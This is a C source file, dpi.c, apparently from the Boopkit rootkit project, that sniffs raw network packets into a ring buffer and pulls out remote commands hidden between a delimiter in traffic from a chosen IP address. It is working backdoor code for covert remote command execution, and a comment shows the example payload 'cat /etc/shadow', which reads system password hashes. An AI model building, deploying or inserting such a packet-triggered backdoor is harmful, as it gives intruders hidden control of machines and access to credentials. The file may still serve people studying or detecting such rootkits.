// Copyright © 2022 Kris Nóva <kris@nivenly.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗
// ████╗  ██║██╔═████╗██║   ██║██╔══██╗
// ██╔██╗ ██║██║██╔██║██║   ██║███████║
// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║
// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
//
// [dpi.c]

#define _GNU_SOURCE
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <pcap.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
// clang-format off
#include "dpi.h"
#include "common.h"
// clang-format on

/**
 * xcap_ring_buffer is the global ring buffer for dpi.c
 */
xcap_ip_packet *xcap_ring_buffer[XCAP_BUFFER_SIZE];

/**
 * xcap_pos is the position of the stack iterator for
 * the global xcap_ring_buffer.
 */
int xcap_pos = 0;

/**
 * runtime__xcap is the condition to continue to capture packets.
 */
int runtime__xcap = 1;

/**
 * dpi.c must be thread safe, this is the ring buffer mutex for mutating
 * memory.
 */
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

/**
 * xpack_dump is a debug method that is used to debug print
 * a single packet.
 *
 * Dear non-linear time life Nóva, I love you for writing this.
 *
 * @param xpack the packet to debug
 */
void xpack_dump(xcap_ip_packet *xpack) {
  boopprintf("  -> Dumping Raw Xpack:\n");
  unsigned char *packet = xpack->packet;
  for (int j = 0; j < xpack->header->caplen; j++) {
    boopprintf("%c", packet[j]);
  }
  boopprintf("\n");
}

/**
 * xcap_ring_buffer_dump is a debug method that can be used
 * to debug all captured packets in a ring buffer.
 *
 * @param xbuff
 */
void xcap_ring_buffer_dump(xcap_ip_packet *xbuff[XCAP_BUFFER_SIZE]) {
  boopprintf("  -> Dumping Raw xCap Buffer:\n");
  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
    struct xcap_ip_packet *xpack;
    xpack = xbuff[i];
    if (!xpack->captured || xpack->header->caplen < 1) {
      continue;
    }
    xpack_dump(xpack);
  }
}

/**
 * xcap_ring_buffer_free is used to free up a ring buffer.
 *
 * @param xbuff the ring buffer to free
 */
void xcap_ring_buffer_free(xcap_ip_packet *xbuff[XCAP_BUFFER_SIZE]) {
  boopprintf("  -> Free Ring Buffer\n");
  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
    struct xcap_ip_packet *xpack;
    xpack = xbuff[i];
    xpack->captured = 0;
    free(xpack->packet);
    free(xpack->iph);
    free(xpack->header);
    free(xpack);
  }
}

/**
 * xcap_ring_buffer_init must be used to initalize a new ring buffer!
 *
 * @param xbuff is the ring buffer to initialize
 */
void xcap_ring_buffer_init(xcap_ip_packet *xbuff[XCAP_BUFFER_SIZE]) {
  boopprintf("  -> Initalizing Ring Buffer\n");
  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
    struct xcap_ip_packet *xpack = malloc(sizeof(struct xcap_ip_packet));
    xpack->packet = malloc(1);  // Init to 1 byte to begin!
    xpack->iph = malloc(sizeof(struct ip));
    xpack->header = malloc(sizeof(struct pcap_pkthdr));
    xpack->captured = 0;
    xbuff[i] = xpack;
  }
}

/**
 * rce_filter will filter an RCE value from in between
 * the BOOPKIT_RCE_DELIMITER
 *
 * Such as:
 *    raw:  X*x.x*Xcat /etc/shadowX*x.x*X
 *    rce: /etc/shadow
 * @param raw
 * @param rce
 * @return 1 success, 0 failure
 */
int rce_filter(char *raw, char *rce) {
  char *target = NULL;
  char *start, *end;
  start = strstr(raw, BOOPKIT_RCE_DELIMITER);
  if (start) {
    start += strlen(BOOPKIT_RCE_DELIMITER);
    end = strstr(start, BOOPKIT_RCE_DELIMITER);
    if (end) {
      target = (char *)malloc(end - start + 1);
      memcpy(target, start, end - start);
      target[end - start] = '\0';
    }
  }
  if (target) {
    strncpy(rce, target, strlen(target) + 1);
    free(target);
    return 1;
  }
  return 0;
}

/**
 * xcap will listen on a specific Linux interface and capture
 * raw network packets into a ring buffer at runtime.
 *
 * Run this in a unique thread to process packets on the backend.
 * @param v_dev_name
 * @return
 */
void *xcap(void *v_dev_name) {
  char *dev_name = (char *)v_dev_name;
  char filter_exp[] = "";
  int cycle = 0;

  pcap_t *handle;
  char errbuf[PCAP_ERRBUF_SIZE];
  bpf_u_int32 mask;
  bpf_u_int32 net;

  struct bpf_program fp;
  struct pcap_pkthdr header;
  struct ether_header *ep;
  unsigned short ether_type;
  const u_char *packet;
  struct ip *iph;

  boopprintf("  -> Starting xCap Interface : %s\n", dev_name);

  if (pcap_lookupnet(dev_name, &net, &mask, errbuf) == -1) {
    boopprintf("Couldn't get netmask for device %s: %s\n", dev_name, errbuf);
    net = 0;
    mask = 0;
  }

  handle = pcap_open_live(dev_name, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    boopprintf("Couldn't open device %s: %s\n", dev_name, errbuf);
    return NULL;
  }

  if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
    boopprintf("Couldn't parse filter %s: %s\n", filter_exp,
               pcap_geterr(handle));
    return NULL;
  }
  if (pcap_setfilter(handle, &fp) == -1) {
    boopprintf("Couldn't install filter %s: %s\n", filter_exp,
               pcap_geterr(handle));
    return NULL;
  }

  xcap_ring_buffer_init(xcap_ring_buffer);
  boopprintf("  -> xCap RingBuffer Started : %s\n", dev_name);

  while (runtime__xcap) {
    packet = pcap_next(handle, &header);
    ep = (struct ether_header *)packet;
    ether_type = ntohs(ep->ether_type);
    if (ether_type != ETHERTYPE_IP) {
      continue;
    }
    packet += sizeof(struct ether_header);
    iph = (struct ip *)packet;

    // Debug system for source addr
    //char buf[INET_ADDRSTRLEN];
    //inet_ntop(AF_INET, &iph->ip_src, buf, sizeof buf);
    //boopprintf("IP Source: %s\n", buf);

    if (xcap_pos == XCAP_BUFFER_SIZE) {
      xcap_pos = 0;
      cycle = 1;
    }
    if (cycle) {
      pthread_mutex_lock(&lock);
      free(xcap_ring_buffer[xcap_pos]->packet);
      free(xcap_ring_buffer[xcap_pos]->iph);
      free(xcap_ring_buffer[xcap_pos]->header);
      free(xcap_ring_buffer[xcap_pos]);
      pthread_mutex_unlock(&lock);
    }

    // Write a new xpack to the ring buffer
    struct xcap_ip_packet *xpack = malloc(sizeof(xcap_ip_packet));
    xpack->packet = malloc(header.len);
    xpack->iph = malloc(sizeof(struct ip));
    xpack->header = malloc(sizeof(struct pcap_pkthdr));
    xpack->captured = 1;
    memcpy(xpack->packet, packet, header.len);
    memcpy(xpack->iph, iph, sizeof(struct ip));
    memcpy(xpack->header, &header, sizeof(struct pcap_pkthdr));
    pthread_mutex_lock(&lock);
    xcap_ring_buffer[xcap_pos] = xpack;
    pthread_mutex_unlock(&lock);
    xcap_pos++;
  }

  xcap_ring_buffer_free(xcap_ring_buffer);
  pcap_close(handle);
  return NULL;
}

/**
 * snapshot will effectively lock the global xcap_ring_buffer and take a
 * snapshot of the packets in memory.
 *
 * @param snap a fresh copy of the memory when the snapshot was taken.
 * @return 1 success
 */
int snapshot(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]) {
  boopprintf("  -> Taking snapshot of network traffic.\n");
  pthread_mutex_lock(&lock);
  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
    struct xcap_ip_packet *from = xcap_ring_buffer[i];
    struct xcap_ip_packet *to = malloc(sizeof(xcap_ip_packet));
    if (!from->captured) {
      continue;
    }

    // capture
    to->captured = from->captured;

    // packet
    to->packet = malloc(from->header->caplen);
    memcpy(to->packet, from->packet, from->header->caplen);

    // iph
    to->iph = malloc(sizeof(struct ip));
    memcpy(to->iph, from->iph, sizeof(struct ip));

    // header
    to->header = malloc(sizeof(struct pcap_pkthdr));
    memcpy(to->header, from->header, sizeof(struct pcap_pkthdr));
    snap[i] = to;
  }
  pthread_mutex_unlock(&lock);
  return 1;
}

/**
 * xcaprce is used to look for an RCE in the ring buffer.
 *
 * @param search is the IP address to filter packets on (perfomance)
 * @param rce is the RCE to execute, as filtered as possible
 * @return
 */
int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
  sleep(1);  // Wait for the kernel to catch up :)
  boopprintf("  -> Search xCap Ring Buffer: %s\n", search);
  xcap_ip_packet *snap[XCAP_BUFFER_SIZE];
  xcap_ring_buffer_init(snap);
  snapshot(snap);

  // Search
  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
    struct xcap_ip_packet *xpack;
    xpack = snap[i];
    if (!xpack->captured) {
      continue;
    }

    char *xpack_saddr = inet_ntoa(xpack->iph->ip_src);
    //boopprintf("xpack source addr: %s\n", xpack_saddr);

    char *ret = strstr(search, xpack_saddr);
    if (!ret) {
      continue;  // Filter packets not from our IP address
    }

    // Ring Buffer Packet Debugging Time
    //xpack_dump(xpack);

    // Debug system for source addr
    //char buf[INET_ADDRSTRLEN];
    //inet_ntop(AF_INET, &xpack->iph->ip_src, buf, sizeof buf);
    //boopprintf("IP Source: %s\n", buf);

    // Begin DPI
    unsigned char *packet = xpack->packet;
    char *rce_sub;
    rce_sub = memmem(packet, xpack->header->caplen, BOOPKIT_RCE_DELIMITER,
                     strlen(BOOPKIT_RCE_DELIMITER));
    if (rce_sub != NULL) {
      boopprintf("  -> Found RCE xCap!\n");
      int found;
      found = rce_filter(rce_sub, rce);
      // Flush the snapshot
      xcap_ring_buffer_free(snap);

      // Flush the main ring buffer
      xcap_ring_buffer_free(xcap_ring_buffer);
      xcap_ring_buffer_init(xcap_ring_buffer);
      if (found) {
        return 1;
      } else {
        boopprintf("  XX [FILTER FAILURE] No RCE in xCap!\n");
        return 0;
      }
    }
  }
  boopprintf("  -> No RCE in xCap!\n");
  xcap_ring_buffer_free(snap);
  return 0;
}
